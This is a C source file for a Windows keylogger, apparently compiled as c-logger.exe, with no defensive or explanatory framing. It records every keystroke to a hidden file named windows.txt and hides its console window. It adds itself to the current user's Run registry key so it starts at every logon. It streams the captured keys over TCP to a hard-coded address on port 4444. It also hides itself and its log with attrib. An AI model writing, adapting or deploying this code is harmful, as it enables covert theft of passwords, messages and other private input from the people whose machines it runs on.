#pragma warning(disable:4996)
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define SIZE 1024
#define bzero(p, size) (void) memset((p), 0, (size))


int sock;

DWORD WINAPI send_file(FILE *fp, int sock)
{
    char data[SIZE] = {0};

    while(fgets(data, SIZE, fp)!=NULL)
    {
        if(send(sock, data, sizeof(data), 0)== -1)
        {
            perror("[-] Error in sendung data");
            exit(1);
        }
        bzero(data, SIZE);
    }
}

char err[128] = "Failed\n";
char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
TCHAR szPath[MAX_PATH];
DWORD pathLen = 0;


DWORD WINAPI boot(void* data) {

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		printf("%s", err);
		return -1;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		printf("%s", err);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("windows"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		printf("%s", err);
		return -1;
	}
	RegCloseKey(NewVal);
	printf("%s", suc);

	return 0;
}

DWORD WINAPI hide(LPVOID lpParameter, HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);
}

char buffer[1024];
char container[1024];
char total_response[18384];
char buf[1025];

int main()
{
	int vkey, last_key_state[0xFF];
	int isCAPSLOCK, isNUMLOCK;
	int isL_SHIFT, isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[] = ")!@#$%^&*(";
	char chars_vn[] = ";=,-./`";
	char chars_vs[] = ":+<_>?~";
	char chars_va[] = "[\\]\';";
	char chars_vb[] = "{|}\"";
	char KEY_LOG_FILE[] = "windows.txt";
	char text[] = "";
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char* ServIP;
	WSADATA wsaData;
	FILE *fp = fopen(KEY_LOG_FILE, "w");
	int e;
	FILE *kh = fopen(KEY_LOG_FILE, "r");
	
	
	ServIP = "192.168.0.2";	/*enter IP here ---------------------------------	*/
	ServPort = 4444;
	
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {

		exit(1);

	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	
	e = connect(sock, (struct sockaddr*)&ServAddr, sizeof(ServAddr));
  	
	HANDLE thread = CreateThread(NULL, 0, boot, NULL, 0, NULL);
	HANDLE thread2 = CreateThread(NULL, 0, hide, NULL, 0, NULL);
	
	
	// making last key state 0
	for (vkey = 0; vkey < 0xFF; vkey++)
	{
		last_key_state[vkey] = 0;
	}
	

	// running infinite
	while (1)
	{
		// take rest for 10 milliseconds
		// get key state of CAPSLOCK,NUMLOCK
		// get key LEFT_SHIFT,RIGHT_SHIFT
		isCAPSLOCK = (GetKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
		isNUMLOCK = (GetKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
		isL_SHIFT = (GetKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
		isR_SHIFT = (GetKeyState(0xA1) & 0xFF00) > 0 ? 1 : 0;

		// checking state of all virtual keys
		for (vkey = 0; vkey < 0xFF; vkey++)
		{
			isPressed = (GetKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
			showKey = (char)vkey;
			if (isPressed == 1 && last_key_state[vkey] == 0)
			{
				// for alphabets
				if (vkey >= 0x41 && vkey <= 0x5A)
				{
					if (isCAPSLOCK == 0)
					{
						if (isL_SHIFT == 0 && isR_SHIFT == 0)
						{
							showKey = (char)(vkey + 0x20);
						}
					}
					else if (isL_SHIFT == 1 || isR_SHIFT == 1)
					{
						showKey = (char)(vkey + 0x20);
					}
				}

				// for num chars
				else if (vkey >= 0x30 && vkey <= 0x39)
				{
					if (isL_SHIFT == 1 || isR_SHIFT == 1)
					{
						showKey = NUMCHAR[vkey - 0x30];
					}
				}

				// for right side numpad
				else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1)
				{
					showKey = (char)(vkey - 0x30);
				}


				// for printable chars
				else if (vkey >= 0xBA && vkey <= 0xC0)
				{
					if (isL_SHIFT == 1 || isR_SHIFT == 1)
					{
						showKey = chars_vs[vkey - 0xBA];
					}
					else
					{
						showKey = chars_vn[vkey - 0xBA];
					}
				}

				// miscellaneous
				else if (vkey >= 0xDB && vkey <= 0XDF)
				{
					if (isL_SHIFT == 1 || isR_SHIFT == 1)
					{
						showKey = chars_vb[vkey - 0xDB];
					}
					else
					{
						showKey = chars_va[vkey - 0xDB];
					}
				}

				// for right side chars ./*-+..
				// for chars like space, \n, enter etc..
				// for enter use newline char
				// don't print other keys
				else if (vkey == 0x0D)
				{
					showKey = (char)0x0A;
				}
				else if (vkey >= 0x6A && vkey <= 0x6F)
				{
					showKey = (char)(vkey - 0x40);
				}
				else if (vkey != 0x20 && vkey != 0x99)
				{
					showKey = (char)0x00;
				}

				// print and save captured key
				if (showKey != (char)0x00)
				{

					fp = fopen(KEY_LOG_FILE, "a");
					putc(showKey, fp);
					fclose(fp);
					send_file(kh,sock);
					system("attrib +s +h windows.txt");
					system("attrib +s +h c-logger.exe");
				}
			}
			// save last state of key
			last_key_state[vkey] = isPressed;
		}
		
		
	} // end of while loop
	system("attrib +s +h windows.txt");
	system("attrib +s +h c-logger.exe");
	return 0;
}// end of function
